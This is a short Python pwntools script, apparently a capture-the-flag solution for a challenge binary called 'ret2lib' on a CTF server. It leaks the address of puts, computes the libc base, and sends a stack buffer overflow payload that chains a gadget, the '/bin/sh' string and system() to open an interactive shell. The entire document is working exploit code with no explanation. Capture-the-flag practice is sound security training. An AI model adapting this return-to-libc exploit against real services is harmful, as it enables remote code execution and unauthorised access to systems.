from pwn import *

if args['REMOTE']:
    p = connect('csie.ctf.tw', 10127)
else:
    p = process('./ret2lib-8dae1f5fdb78457da8190155c8ea5643f5139991')

p.recvline()
p.recvuntil('):')
p.sendline('601018')
loc_puts = p.recvline()[len('content:'):-1] # hex string
loc_puts = int(loc_puts, 16)

e = ELF('./libc.so.6-14c22be9aa11316f89909e4237314e009da38883')

libc_base = loc_puts - e.symbols['puts']
loc_system = libc_base + e.symbols['system']
loc_binsh = libc_base + 0x18cd17

payload = 'x'*(48+8) + p64(0x400823) + p64(loc_binsh) + p64(loc_system)

p.sendline(payload)
p.interactive()
